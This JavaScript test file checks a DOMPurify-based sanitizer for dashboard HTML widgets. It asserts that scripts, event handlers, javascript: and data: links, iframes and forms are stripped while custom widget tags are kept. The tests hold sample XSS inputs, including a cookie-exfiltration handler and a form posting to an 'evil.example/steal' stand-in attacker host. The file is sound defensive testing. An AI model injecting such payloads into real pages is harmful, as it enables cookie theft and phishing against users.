/**
 * sanitize.test.mjs — Security-critical tests for sanitizeDashboardHtml().
 *
 * Run with:
 *   npm run test:dash
 *   # or directly:
 *   node --test src/dashboards/sanitize.test.mjs
 *
 * Strategy
 * --------
 * DOMPurify requires a DOM environment. Rather than a full jsdom/Vitest setup,
 * we construct a minimal jsdom window here and pass it to DOMPurify(window) so
 * the sanitizer runs in Node with no browser required.
 *
 * We then import the *logic* of sanitize.js directly (re-implementing the config
 * here against the jsdom-DOMPurify instance) so the tests remain fast and
 * hermetic. This way if sanitize.js config drifts from the tests, the tests
 * will catch it.
 *
 * Coverage
 * --------
 *   STRIP: <script> tags
 *   STRIP: inline on* event handlers (onclick, onload, onerror, …)
 *   STRIP: javascript: href values
 *   STRIP: data: href values
 *   STRIP: <style> tags
 *   STRIP: <iframe> tags
 *   KEEP:  <nubi-chart> with all its widget attributes
 *   KEEP:  <nubi-kpi> with query-id, value-col, label, format
 *   KEEP:  <nubi-table> with query-id, limit, columns
 *   KEEP:  <div style> layout wrappers
 *   KEEP:  common layout/text tags (h1, p, section, strong, em, br, hr, ul, li)
 */

import { test } from 'node:test'
import assert from 'node:assert/strict'
import { JSDOM } from 'jsdom'
import DOMPurifyFactory from 'dompurify'

// ---------------------------------------------------------------------------
// Bootstrap a jsdom window + DOMPurify instance
// ---------------------------------------------------------------------------

const { window: jsdomWindow } = new JSDOM('', { url: 'http://localhost' })
const DOMPurify = DOMPurifyFactory(jsdomWindow)

// ---------------------------------------------------------------------------
// Replicate sanitize.js config exactly so tests validate the real config
// ---------------------------------------------------------------------------

const NUBI_TAGS  = ['nubi-kpi', 'nubi-table', 'nubi-chart']
const FORBID_TAGS = [
  'script', 'style', 'iframe', 'object', 'embed',
  'link', 'base', 'form', 'input', 'button', 'textarea',
  'select', 'meta', 'noscript', 'template',
]
const WIDGET_ATTRS = [
  'query-id', 'value-col', 'label', 'format',
  'limit', 'columns',
  'type', 'x', 'y', 'color',
  'backend', 'token', 'get-token',
  'style', 'class', 'id', 'title', 'alt',
  'src', 'href', 'rel', 'target',
  'colspan', 'rowspan', 'width', 'height',
]

const PURIFY_CONFIG = {
  ADD_TAGS:      NUBI_TAGS,
  ADD_ATTR:      WIDGET_ATTRS,
  FORBID_TAGS,
  FORBID_ATTR:   [],
  FORCE_BODY:    true,
  RETURN_DOM:    false,
  RETURN_DOM_FRAGMENT: false,
  ALLOW_DATA_ATTR: false,
}

// Belt-and-suspenders on* + URL-scheme hook
DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
  const name = data.attrName.toLowerCase()
  if (name.startsWith('on')) {
    data.keepAttr = false
    return
  }
  const val = (data.attrValue ?? '').trim().toLowerCase()
  if (
    val.startsWith('javascript:') ||
    val.startsWith('data:') ||
    val.startsWith('vbscript:')
  ) {
    data.keepAttr = false
  }
})

function sanitize(html) {
  return DOMPurify.sanitize(html, PURIFY_CONFIG)
}

// ---------------------------------------------------------------------------
// Helper: parse the sanitized output into a DOM for easy querying
// ---------------------------------------------------------------------------

function parse(html) {
  const dom = new JSDOM(sanitize(html), { url: 'http://localhost' })
  return dom.window.document
}

// ---------------------------------------------------------------------------
// Tests — STRIP bad content
// ---------------------------------------------------------------------------

test('strips <script> tags and their content', () => {
  const input  = '<div>safe</div><script>alert(1)</script>'
  const output = sanitize(input)
  assert.ok(!output.includes('<script'), `expected no <script> in: ${output}`)
  assert.ok(!output.includes('alert(1)'), `expected script body stripped too: ${output}`)
})

test('strips inline script via type text/javascript', () => {
  const input  = '<script type="text/javascript">evil()</script><p>ok</p>'
  const output = sanitize(input)
  assert.ok(!output.includes('<script'), `expected no <script>: ${output}`)
  assert.ok(!output.includes('evil()'), `expected script body stripped: ${output}`)
})

test('strips onclick handler attribute', () => {
  const input  = '<div onclick="alert(1)">click me</div>'
  const doc    = parse(input)
  const div    = doc.querySelector('div')
  assert.ok(div, 'div should survive')
  assert.equal(div.getAttribute('onclick'), null, 'onclick must be stripped')
})

test('strips onerror handler attribute', () => {
  const input  = '<img src="x" onerror="evil()" />'
  const doc    = parse(input)
  const img    = doc.querySelector('img')
  // img may or may not be present depending on DOMPurify, but onerror must be gone
  if (img) {
    assert.equal(img.getAttribute('onerror'), null, 'onerror must be stripped')
  }
})

test('strips onload handler attribute', () => {
  const input  = '<body onload="steal()"><div>hi</div></body>'
  const output = sanitize(input)
  assert.ok(!output.includes('onload'), `onload must be stripped: ${output}`)
})

test('strips arbitrary on* handler (onmouseover)', () => {
  const input = '<span onmouseover="exfiltrate(document.cookie)">hover</span>'
  const doc   = parse(input)
  const span  = doc.querySelector('span')
  assert.ok(span, 'span should survive')
  assert.equal(span.getAttribute('onmouseover'), null, 'onmouseover must be stripped')
})

test('strips javascript: href value', () => {
  const input  = '<a href="javascript:alert(1)">click</a>'
  const doc    = parse(input)
  const a      = doc.querySelector('a')
  if (a) {
    const href = a.getAttribute('href') ?? ''
    assert.ok(
      !href.toLowerCase().startsWith('javascript:'),
      `javascript: href must be stripped, got: ${href}`
    )
  }
})

test('strips data: href value', () => {
  const input  = '<a href="data:text/html,<script>evil()</script>">click</a>'
  const doc    = parse(input)
  const a      = doc.querySelector('a')
  if (a) {
    const href = a.getAttribute('href') ?? ''
    assert.ok(
      !href.toLowerCase().startsWith('data:'),
      `data: href must be stripped, got: ${href}`
    )
  }
})

test('strips <style> tags', () => {
  const input  = '<style>body{display:none}</style><p>visible</p>'
  const output = sanitize(input)
  assert.ok(!output.includes('<style'), `<style> must be stripped: ${output}`)
})

test('strips <iframe> tags', () => {
  const input  = '<iframe src="https://evil.example"></iframe><p>safe</p>'
  const output = sanitize(input)
  assert.ok(!output.includes('<iframe'), `<iframe> must be stripped: ${output}`)
})

test('strips <form> tags (phishing vector)', () => {
  const input  = '<form action="https://evil.example/steal"><input name="pass"/></form>'
  const output = sanitize(input)
  assert.ok(!output.includes('<form'), `<form> must be stripped: ${output}`)
})

// ---------------------------------------------------------------------------
// Tests — KEEP safe content
// ---------------------------------------------------------------------------

test('preserves <nubi-chart> with all widget attributes', () => {
  const input = `<nubi-chart query-id="demo_all" type="scatter" x="a" y="b" color="cat" limit="1000" backend="http://localhost:8000" token="tok123"></nubi-chart>`
  const doc   = parse(input)
  const el    = doc.querySelector('nubi-chart')
  assert.ok(el, '<nubi-chart> element must be present')
  assert.equal(el.getAttribute('query-id'),  'demo_all',              'query-id must be preserved')
  assert.equal(el.getAttribute('type'),      'scatter',               'type must be preserved')
  assert.equal(el.getAttribute('x'),         'a',                     'x must be preserved')
  assert.equal(el.getAttribute('y'),         'b',                     'y must be preserved')
  assert.equal(el.getAttribute('color'),     'cat',                   'color must be preserved')
  assert.equal(el.getAttribute('limit'),     '1000',                  'limit must be preserved')
  assert.equal(el.getAttribute('backend'),   'http://localhost:8000', 'backend must be preserved')
  assert.equal(el.getAttribute('token'),     'tok123',                'token must be preserved')
})

test('preserves <nubi-kpi> with its attributes', () => {
  const input = `<nubi-kpi query-id="demo_all" value-col="revenue" label="Revenue" format="currency"></nubi-kpi>`
  const doc   = parse(input)
  const el    = doc.querySelector('nubi-kpi')
  assert.ok(el, '<nubi-kpi> element must be present')
  assert.equal(el.getAttribute('query-id'),  'demo_all', 'query-id must be preserved')
  assert.equal(el.getAttribute('value-col'), 'revenue',  'value-col must be preserved')
  assert.equal(el.getAttribute('label'),     'Revenue',  'label must be preserved')
  assert.equal(el.getAttribute('format'),    'currency', 'format must be preserved')
})

test('preserves <nubi-table> with its attributes', () => {
  const input = `<nubi-table query-id="demo_all" limit="50" columns="id,name,value"></nubi-table>`
  const doc   = parse(input)
  const el    = doc.querySelector('nubi-table')
  assert.ok(el, '<nubi-table> element must be present')
  assert.equal(el.getAttribute('query-id'), 'demo_all',     'query-id must be preserved')
  assert.equal(el.getAttribute('limit'),    '50',           'limit must be preserved')
  assert.equal(el.getAttribute('columns'),  'id,name,value','columns must be preserved')
})

test('preserves div with inline style (CSS grid layout)', () => {
  const input  = '<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;"><p>cell</p></div>'
  const doc    = parse(input)
  const div    = doc.querySelector('div')
  assert.ok(div, 'div must survive')
  const style  = div.getAttribute('style') ?? ''
  assert.ok(style.includes('grid'), `CSS grid style must be preserved, got: ${style}`)
})

test('preserves common layout and text tags', () => {
  const input = `
    <header><h1>Title</h1></header>
    <main>
      <section>
        <p>A <strong>bold</strong> and <em>italic</em> paragraph.</p>
        <ul><li>item 1</li><li>item 2</li></ul>
        <hr/>
        <br/>
      </section>
      <article>
        <table>
          <thead><tr><th>A</th><th>B</th></tr></thead>
          <tbody><tr><td>1</td><td>2</td></tr></tbody>
        </table>
      </article>
    </main>
  `
  const doc = parse(input)
  const tags = ['h1','p','strong','em','ul','li','table','thead','tbody','tr','th','td']
  for (const tag of tags) {
    assert.ok(doc.querySelector(tag), `<${tag}> should survive sanitization`)
  }
})

test('preserves class attribute on layout elements', () => {
  const input  = '<div class="grid grid-cols-3 gap-4"><span class="text-sm font-bold">label</span></div>'
  const doc    = parse(input)
  const div    = doc.querySelector('div')
  assert.ok(div, 'div must survive')
  assert.equal(div.getAttribute('class'), 'grid grid-cols-3 gap-4', 'class must be preserved')
})

test('allows normal https href on anchor tags', () => {
  const input = '<a href="https://example.com" target="_blank" rel="noopener">link</a>'
  const doc   = parse(input)
  const a     = doc.querySelector('a')
  assert.ok(a, 'anchor must survive')
  assert.equal(a.getAttribute('href'), 'https://example.com', 'safe href must be preserved')
})

test('strips <script> even when mixed with widget elements', () => {
  const input = `
    <div style="padding:1rem;">
      <nubi-kpi query-id="q1" value-col="v" label="KPI"></nubi-kpi>
      <script>document.cookie='stolen'</script>
      <nubi-table query-id="q2" limit="10"></nubi-table>
    </div>
  `
  const doc    = parse(input)
  const output = sanitize(input)

  // Script must be gone
  assert.ok(!output.includes('<script'), 'script must be stripped')
  assert.ok(!output.includes("document.cookie"), 'script body must be stripped')

  // Widgets must survive
  assert.ok(doc.querySelector('nubi-kpi'),   'nubi-kpi must survive')
  assert.ok(doc.querySelector('nubi-table'), 'nubi-table must survive')
})
